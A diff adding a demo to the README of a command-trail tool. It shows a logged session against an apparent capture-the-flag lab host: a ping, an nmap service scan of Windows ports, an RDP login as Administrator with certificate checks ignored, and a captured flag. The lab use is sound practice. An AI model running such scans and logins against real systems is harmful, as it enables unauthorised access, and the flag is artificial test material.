@@ -1,5 +1,19 @@
 # trail
 Leave a trail of commands
+```bash
+c to add a comment • esc quit
+0 ping 10.129.134.166
+1 nmap -sV 10.129.134.166
+  • 135/tcp  open  msrpc         Microsoft Windows RPC
+    139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+    445/tcp  open  microsoft-ds?
+    3389/tcp open  ms-wbt-server Microsoft Terminal Services
+    5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+
+2 xfreerdp3 /v:10.129.134.166 /cert:ignore /u:Administrator
+  • hit
+  • flag: 951fa96d7830c451b536be5a6be008a0
+```
 
 <br>
 
